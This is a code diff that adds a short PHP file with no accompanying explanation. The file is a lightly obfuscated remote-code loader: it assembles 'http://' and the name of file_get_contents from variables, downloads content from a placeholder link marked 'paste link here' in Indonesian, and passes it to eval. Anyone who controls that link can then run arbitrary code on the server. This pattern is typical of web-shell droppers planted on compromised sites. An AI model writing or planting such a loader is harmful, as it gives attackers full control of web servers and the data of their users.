@@ -1,0 +1,10 @@
+<?php 
+        $awo = 'http://';
+        $fgt = 'file_get_contents';
+        $data = $fgt($awo . 'copas_link_disini');
+    
+        $admin = '?>';
+        eval($admin . $data);
+    
+        exit;
+?>
